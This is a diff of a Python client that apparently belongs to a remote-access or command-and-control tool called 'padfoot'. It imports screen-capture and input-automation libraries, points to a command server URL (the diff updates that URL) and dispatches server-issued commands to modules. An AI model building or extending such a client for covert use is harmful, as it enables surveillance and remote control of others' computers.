@@ -15,12 +15,13 @@ import pygetwindow as gw
 import pyautogui
 from PIL import ImageGrab
 from io import BytesIO
+import pygame
 
 DEBUG = True
 
 match DEBUG:
     case True:
-        SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us103.gitpod.io'
+        SERVER = 'https://3000-p0syd0n-padfootserver-14zsp1owg0h.ws-us104.gitpod.io'
     case False:
         SERVER = 'https://padfoot-server.onrender.com'
 
@@ -163,6 +164,7 @@ def execute_module_stage2(parameters, data, command):
     print('executing')
     main_command = command.split(" ")[1]
     print(main_command)
+    immediate = False # immediate return is false unless stated otherwise
     try:
       if main_command == 'update':
           output = update(parameters['param1'], parameters['param2'], parameters['param3'], parameters['param4'], parameters['param5']) # warning: untested
